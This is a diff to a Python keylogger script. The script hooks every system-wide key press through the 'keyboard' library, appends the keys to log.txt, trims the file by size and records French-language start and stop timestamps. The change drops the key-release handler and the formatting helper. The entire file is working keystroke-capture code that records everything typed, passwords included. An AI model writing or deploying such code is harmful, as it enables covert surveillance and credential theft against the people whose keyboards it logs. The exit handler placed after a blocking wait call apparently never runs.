@@ -2,8 +2,8 @@ import keyboard
 import os
 import datetime
 
-# dictionary mapping special keys to their human-readable names
-SPECIAL_KEYS_MAP = {
+# dictionary mapping keys to their string representations
+KEY_MAP = {
     "space": " [SPACE] ",
     "enter": " [ENTER] ",
     "esc": " [ESC] ",
@@ -43,27 +43,12 @@ MAX_FILE_SIZE = 6000
 # number of lines to keep in file
 NUM_LINES_TO_KEEP = 1000
 
-# function to add content to a file without needing to open and close it each time
-def append_to_file(filename, content):
-    with open(filename, "a") as f:
-        f.write(content)
-
 # function to write keyboard inputs to file
 def write_keys(keys_pressed):
-    formatted_keys = format_keys(keys_pressed)
-    append_to_file("log.txt", formatted_keys)
+    with open("log.txt", "a") as f:
+        f.write("".join(keys_pressed))
 
-# function to format keys with brackets around special keys
-def format_keys(keys_pressed):
-    formatted_keys = ""
-    for key in keys_pressed:
-        if key in SPECIAL_KEYS_MAP:
-            formatted_keys += SPECIAL_KEYS_MAP[key]
-        else:
-            formatted_keys += key
-    return formatted_keys
-
-# function to clean file if size exceeds MAX_FILE_SIZE
+# function to clean file if size exceeds max_file_size
 def clean_file():
     with open("log.txt", "r+") as f:
         lines = f.readlines()
@@ -76,49 +61,29 @@ def clean_file():
 def on_press(event):
     try:
         keys_pressed = []
-        if event.name in SPECIAL_KEYS_MAP:
-            keys_pressed.append(event.name)
+        if event.name in KEY_MAP:
+            keys_pressed.append(KEY_MAP[event.name])
         elif event.name.isprintable():
             keys_pressed.append(event.name)
-        formatted_keys = format_keys(keys_pressed)
-        append_to_file("log.txt", formatted_keys)
+        write_keys(keys_pressed)
         if os.path.getsize("log.txt") > MAX_FILE_SIZE:
             clean_file()
     except Exception as e:
         print(f"Error: {e}")
 
-# function called on each key release
-def on_release(event):
-    try:
-        keys_pressed = []
-        if event.name in ["ctrl", "alt", "maj"]:
-            for key in ["ctrl", "alt", "maj"]:
-                if keyboard.is_pressed(key):
-                    keys_pressed.append(key)
-            if len(keys_pressed) > 0:
-                formatted_keys = format_keys(keys_pressed)
-                append_to_file("log.txt", formatted_keys)
-        elif event.name.isprintable():
-            write_keys([event.name])
-            if os.path.getsize("log.txt") > MAX_FILE_SIZE:
-                clean_file()
-    except Exception as e:
-        print(f"Error: {e}")
+# function called on program exit
+def on_exit():
+    # write end time to file
+    with open("log.txt", "a") as f:
+        f.write(f"Arrêt du script le {datetime.date.today()} à {datetime.datetime.now().strftime('%H:%M:%S')}\n")
 
-# set up keyboard hook
+# write start time to file
+with open("log.txt", "a") as f:
+    f.write(f"Lancement du script le {datetime.date.today()} à {datetime.datetime.now().strftime('%H:%M:%S')}\n")
+
+# start listening for keyboard events
 keyboard.on_press(on_press)
-keyboard.on_release(on_release)
+keyboard.wait()
 
-# create log file if it doesn't exist
-if not os.path.exists("log.txt"):
-    open("log.txt", "w").close()
-
-# log start time
-append_to_file("log.txt", f"\n\n\n\n\n{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} LOG START\n\n\n\n\n")
-
-# keep script running
-while True:
-    try:
-        keyboard.wait()
-    except KeyboardInterrupt:
-        break
+# program exit
+on_exit()
